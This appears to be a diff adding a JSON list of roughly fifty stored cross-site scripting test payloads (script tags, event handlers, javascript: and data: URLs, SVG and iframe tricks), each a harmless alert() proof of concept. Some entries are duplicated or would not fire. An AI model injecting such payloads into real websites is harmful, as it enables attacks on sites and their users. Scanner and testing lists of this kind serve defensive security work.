@@ -1,0 +1,249 @@
+{
+  "payloads": [
+    {
+      "type": "basic_stored_xss",
+      "description": "Stored script tag",
+      "payload": "<script>alert('Stored XSS')</script>"
+    },
+    {
+      "type": "input_stored_xss",
+      "description": "Stored XSS in input fields",
+      "payload": "<input autofocus onfocus=alert('Stored XSS')>"
+    },
+    {
+      "type": "div_stored_xss",
+      "description": "Stored XSS within div tags",
+      "payload": "<div onmouseover=alert('Stored XSS')>Hover me</div>"
+    },
+    {
+      "type": "anchor_stored_xss",
+      "description": "Stored XSS via href",
+      "payload": "<a href='javascript:alert(\"Stored XSS\")'>Click me</a>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Stored script tag",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Closing tag with script",
+      "payload": "\"><script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Single quote script injection",
+      "payload": "'><script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image tag with JavaScript URL",
+      "payload": "<IMG SRC=javascript:alert('XSS')>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image tag with double quotes JavaScript URL",
+      "payload": "<IMG SRC=\"javascript:alert('XSS');\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Case-insensitive JavaScript in image tag",
+      "payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image tag with String.fromCharCode",
+      "payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Malformed image with script",
+      "payload": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG onload event",
+      "payload": "<svg/onload=alert('XSS')>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG with inline script",
+      "payload": "<svg><script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG animation keyframes XSS",
+      "payload": "<svg><style>@keyframes x{}</style><script>alert(1)</script></svg>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Marquee tag with XSS",
+      "payload": "<marquee><h1>XSS</h1></marquee>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Body onload alert",
+      "payload": "<body onload=alert('XSS')>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG onload with alert",
+      "payload": "<svg onload=alert(1)>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "MathML with script",
+      "payload": "<math><mi>xss</mi><script>alert(1)</script></math>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Iframe with JavaScript URL",
+      "payload": "<iframe src=\"javascript:alert('XSS')\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Iframe with script in srcdoc",
+      "payload": "<iframe srcdoc=\"<script>alert('XSS')\"></iframe>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Embed with JavaScript URL",
+      "payload": "<embed src=\"javascript:alert('XSS')\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Object with JavaScript URL",
+      "payload": "<object data=\"javascript:alert('XSS')\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Script tag with alert",
+      "payload": "<script>alert('XSS');</script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Script source with data URL",
+      "payload": "<script src=\"data:text/javascript,alert('XSS');\"></script>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Body onresize alert",
+      "payload": "<body onresize=alert(1)>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Div onmouseover event",
+      "payload": "<div onmouseover=alert(1)>Hover me</div>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Button onclick event",
+      "payload": "<button onclick=alert(1)>Click me</button>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG use with data URL",
+      "payload": "<svg><use href=\"data:text/html,<script>alert(1)</script>\"></use></svg>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Custom tag with iframe XSS",
+      "payload": "<xss><iframe src=\"javascript:alert(1)\"></iframe></xss>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Custom tag with script XSS",
+      "payload": "<xss><script>alert('XSS')</script></xss>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Details tag with ontoggle event",
+      "payload": "<details open ontoggle=alert(1)></details>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Form button with JavaScript URL",
+      "payload": "<form><button formaction=\"javascript:alert(1)\">Submit</button></form>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Input onfocus event",
+      "payload": "<input onfocus=alert(1)>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Textarea autofocus with onfocus event",
+      "payload": "<textarea autofocus onfocus=alert(1)>XSS</textarea>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Div draggable with ondrag event",
+      "payload": "<div draggable=true ondrag=alert(1)>Drag me</div>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Video source with JavaScript URL",
+      "payload": "<video src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image with onerror event",
+      "payload": "<img src=\"x\" onerror=\"alert(1)\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Anchor tag with JavaScript URL",
+      "payload": "<a href=\"javascript:alert(1)\">Click</a>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image with single quote onerror event",
+      "payload": "<img src='x' onerror='alert(1)'>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Script source with data URL",
+      "payload": "<script src=data:,alert(1)>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "MathML with maction XSS",
+      "payload": "<math><maction xlink:href=\"javascript:alert(1)\">X</maction></math>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Iframe with data URL XSS",
+      "payload": "<iframe src=\"data:text/html,<script>alert(1)</script>\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Iframe with JavaScript URL",
+      "payload": "<iframe src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Base tag with JavaScript URL",
+      "payload": "<base href=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Audio tag with JavaScript URL",
+      "payload": "<audio src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG object with base64 data URL",
+      "payload": "<object type=\"image/svg+xml\" data=\"data:image/svg+xml;base64,...\"></object>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "SVG onload event",
+      "payload": "<svg><g onload=\"alert(1)\"></g></svg>"
+    },
+    {
+      "type": "basic_stored_xss",
+      "description": "Image onerror with eval",
+      "payload": "<img src=\"x\" onerror=\"eval('alert(1)')\">"
+    }
+  ]
+}
